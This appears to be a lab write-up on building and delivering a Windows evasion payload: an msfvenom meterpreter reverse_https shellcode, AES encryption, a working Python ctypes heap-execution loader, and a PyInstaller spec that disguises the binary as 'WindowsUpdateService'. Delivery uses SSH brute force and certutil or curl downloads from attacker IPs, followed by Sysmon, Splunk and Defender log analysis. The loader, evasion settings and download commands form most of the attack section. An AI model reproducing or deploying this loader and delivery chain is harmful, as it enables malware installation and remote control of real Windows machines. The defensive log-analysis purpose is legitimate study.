# üõ°Ô∏è Evas√£o e Execu√ß√£o: Criando, Ofuscando e Entregando Shellcode com AES e PyInstaller


## OVERVIEW

In this technical write-up, we conduct a hands-on experiment simulating a Windows defense evasion attack. We create a payload using Metasploit, obfuscate it with AES encryption in Python, and package the malware with PyInstaller.
For delivery, we explore a realistic scenario: an SSH brute-force attack followed by using ```certutil.exe``` to download the payload‚Äîa technique often classified as Living Off the Land Binary (LOLBin).
Throughout the process, we analyze artifacts with Sysmon and Splunk, documenting key indicators and behaviors for SOC analysts and blue teamers.

## üß™ SPLUNK CONFIGURATION ISSUES


During Splunk setup, I encountered issues receiving Sysmon logs in the Splunk GUI. After troubleshooting, I discovered it was a Windows permissions problem. In the Services panel, under the Log On tab, the Local System Account option must be selected, as shown below:

 To receive logs in Splunk, add this code to the output.conf file if not already configured:

## üß™ MALWARE CREATION AND OBFUSCATION

**Shellcode Generation**

For this experiment, I used a Metasploit shellcode obfuscated with Python. The following command generates a raw shellcode:

```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```

This outputs a .raw shellcode, which we then convert to a hexadecimal string:

```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```

**AES Encryption**

Next, I encrypted the shellcode using a 16-byte (128-bit) AES key to bypass Windows defenses. Below is the Python script for encryption:

[VS CODE: ENCRYPTION]
![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)

The shellcode is now ready for embedding.


### Memory Allocation: VirtualAlloc vs. HeapAlloc

   While researching malware development, I encountered two memory allocation methods:

  1. ```VirtualAlloc```: Allocates large memory blocks, leaving clear forensic traces (often flagged by defenses).
  Classic combo: VirtualAlloc + WriteProcessMemory + CreateRemoteThread.

 2. ```HeapAlloc```: Uses smaller memory chunks (common in legit apps), requiring HEAP_CREATE_ENABLE_EXECUTE to mark memory as executable.
  Less suspicious but requires extra steps.

For evasion, I chose ```HeapAlloc```.

Note: Later, I learned VirtualAlloc + VirtualProtect might be more effective for bypassing defenses‚Äîa topic for future research.


### PYTHON EXECUTION SCRIPT

This script decrypts the AES-CBC shellcode (stored in Base64), removes PKCS7 padding, allocates executable memory in a private heap, and runs the shellcode via CreateThread.PKCS7 is a padding method used in block ciphers like AES to ensure data fits the cipher's block size (e.g., 16 bytes for AES-128).


 ```Python
import base64
import ctypes
from Crypto.Cipher import AES

# === KEY AND IV (must match those used during encryption) ===
key = b'ThisIsA16ByteKey'
iv = b'ThisIsA16ByteIV!'

# === Encrypted shellcode (base64) ===
encrypted_b64 = b"2G8Rv5XtiV6HwQS/DsUBAOQB+pUlMLPJ+KwsV9Ixm8ym6BdI7s5kNf0Qw++2d7qKp3ykcrNXnodX8a"
encrypted = base64.b64decode(encrypted_b64)

# === Decrypt using AES-CBC ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
shellcode = decrypted[:-pad_len]

# === Create a private heap ===
heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
if not heap:
    raise Exception("HeapCreate failed")

# === Allocate executable memory in the heap ===
ptr = ctypes.windll.kernel32.HeapAlloc(heap, 0x00000008, len(shellcode))  # HEAP_ZERO_MEMORY
if not ptr:
    raise Exception("HeapAlloc failed")

# === Copy shellcode to the heap ===
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# === Execute the shellcode ===
ht = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ctypes.c_void_p(ptr),
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 ```
    
## üß™ GENERATING THE EXECUTABLE

After configuring the code, I compiled it into an executable using PyInstaller via Wine on Kali Linux:

```bash
wine cmd
pyinstaller --noconfirm --onefile malwareobfuscated.py
```
[PYINSTALLER OUTPUT]
![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)

This generates an executable and a .spec file, which we modify to enhance evasion:

### .SPEC FILE 

```
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['malwareobfuscated.py'],
    pathex=['.'],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,  # enable bytecode optimization
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='WindowsUpdateService',  # process name ‚Äî mimics a legitimate system service
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,  # strip debug symbols from executable
    upx=True,  # apply UPX compression to reduce file size
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # hide console window 
    disable_windowed_traceback=True,  # disable error pop-ups on crash
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=True,
    upx=True,
    name='WindowsUpdateService'
)

```


Key Evasion Features:

   - Process Masquerading: Named WindowsUpdateService.exe.

   - Stealth: No console window, UPX compression, stripped debug symbols.

To build the final executable:

```
wine cmd
pyinstaller --onefile malwareobfuscated.spec
```

## DELIVERING THE MALWARE 

Attack Flow:

  1. Brute-force SSH on an open port.

  2. Download malware via certutil.exe (LOLBin).

 ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```



### 1. Brute-Force Success

Logo apos realizei a requisicao usando certutil.exe como LOLbin:

### First Delivery Attempt

[CERTUTIL DOWNLOAD ATTEMPT]
![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)

**What I observed:**
At first, I assumed certutil.exe had successfully downloaded the malware, and Windows Defender blocked its execution after the transfer. However, no GET request appeared in the Python server logs (as shown in the screenshot), suggesting the request was intercepted before reaching the server.

**Testing the theory:**
To confirm, I tried downloading a harmless file from google.com using the same certutil.exe command:


üîç **Microsoft Defender Detection Log**
```
- **Product**: Microsoft Defender Antivirus  
- **Product Version**: 4.18.25040.2  
- **Detection ID**: {5BE40275-E18B-40CA-8D0A-659F906123B2}  
- **Detection Time**: 2025-05-27 15:29:04 UTC  
- **Threat Name**: Trojan:Win32/Ceprolad.A  
- **Severity**: Severe  
- **Category**: Trojan  
- **Detection User**: NT AUTHORITY\SYSTEM  
- **Process Name**: Unknown  
- **Command Line**: `certutil.exe -urlcache -split -f https://google.com`  
- **Path**: C:\Windows\System32\certutil.exe  
- **Action Taken**: Not Applicable (automatically blocked)  
- **Engine Version**: AM: 1.1.25040.1  
- **Signature Version**: AV: 1.429.193.0  
- **Reference**: [Microsoft Threat Info](https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0)
```
Same behavior: No network traffic reached Google
Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as `Trojan:Win32/Ceprolad.A`.  
This indicates that Windows Defender's protection system does not rely solely on the destination of network requests, but also monitors the behavior of processes within the system (behavior-based detection).


 ### Second Delivery Attempt:

Let's make a final test using one last technique. This time, I created a copy of certutil.exe in a different folder, renamed it, and used this renamed copy to perform a network request. Below are the commands executed and the response received:

```
1.
copy C:\Windows\System32\certutil.exe C:\Users\Public\curl.exe
2.
C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com
```

[RESPONSE FROM THE SECOND ATTEMPT]
 ![Image](https://github.com/user-attachments/assets/1d7c7848-f616-4888-bb17-a946f862cb52)

Even though the command was executed from a different directory and targeted a trusted website, Windows Defender still detected the activity and blocked it.
This clearly demonstrates that Defender does not rely solely on file names, paths, or destination URLs ‚Äî it also monitors behavior patterns to detect suspicious activity.

### Third Delivery Attempt

Since certutil can't be used to download the payload, I decided to perform a simple curl request to check whether Windows Defender would still detect the malware:

```curl http://192.168.56.101:7070/WindowsUpdateService```
![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)


 Even though the payload was encrypted and obfuscated, Windows Defender successfully detected and blocked the malware.
However, this activity generated some interesting logs, which we‚Äôll dive into in the next chapter:

## üîç LOG ANALYSIS

Note: I delivered the malware multiple times over different days while writing this article, so don‚Äôt rely too much on the timestamps in the logs.s 


1. [BRUTE FORCE EVIDENCE]
![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)

This high number of login attempts in such a short time, captured by Splunk, raises a red flag.
Analyzing the Sysmon logs more deeply, we found further evidence of malicious activity.
During the execution of the obfuscated payload, even before a shell was established, the Event Viewer recorded the following behaviors:

3. [REMOTE THREAD CREATION DETECTED]
 ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)

This type of event is typical of malware attempting to execute code in another process to evade detection (such as DLL injection). However, since we already know the malware was not executed, I believe this log was triggered when I requested a cmd.exe session via SSH.Although it is not directly related to the malware, it remains an important artifact.

5. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)

Shortly after the download attempt via certutil.exe, the SecurityHealthHost.exe process, a component of Windows Defender, was triggered. This suggests that the malicious payload/action was detected and blocked by the system‚Äôs native security solution, preventing the full execution of the attack.

***Windows Defender Logs***

6. [DETECTION]
![Image](https://github.com/user-attachments/assets/e1290956-49f1-473f-90bc-caf32dd7de12)

In this log, we see Windows Defender detecting a LOLBin attempt. I've highlighted the most important details below:

```
Threat Name:      Trojan:Win32/Ceprolad.A  
Severity:         Severe  
Detection Time:   2025-05-27 20:29:56 UTC  
Detected By:      NT AUTHORITY\SYSTEM  
Process Name:     certutil.exe  
Command Line:     certutil.exe -urlcache -split -f https://  
Path:             C:\Windows\System32\certutil.exe  
Action Taken:     Not Applicable 
```

As we can see, Windows Defender blocked the request before the connection was established, which is why the IP address was not identified.

4.[CONFIRMATION OF BLOCKING BY THE DEFENSE SYSTEM]
![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)

Here we have confirmation that the threat was successfully removed by Windows Defender, indicated by ```Action Name: Remove``` and the message ```The operation completed successfully```.

5.[SECOND ATTEMPT IDENTIFICATION]
![Image](https://github.com/user-attachments/assets/aa39d6f0-9dad-4fba-831c-7bfe3a810af9)

```Path CmdLine:_C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com```

Last but not least, we have confirmation that Windows Defender detected the malicious execution of
```certutil.exe``` even when it was copied to another directory and renamed.

##THOUGHTS

Although my current focus is on defensive security, this lab ended up exploring offensive techniques more deeply than I expected. The creation and obfuscation of the shellcode gave me a practical insight into how malicious payloads can be built and executed discreetly on Windows.
Although the code can still be improved with more advanced evasion techniques, this experience provided me with a more concrete understanding of how Windows Defender and other security solutions operate.
In the defensive context, this reinforces the importance of knowing the adversary's tools and tactics to develop more effective detections, both in corporate environments and in threat hunting labs.
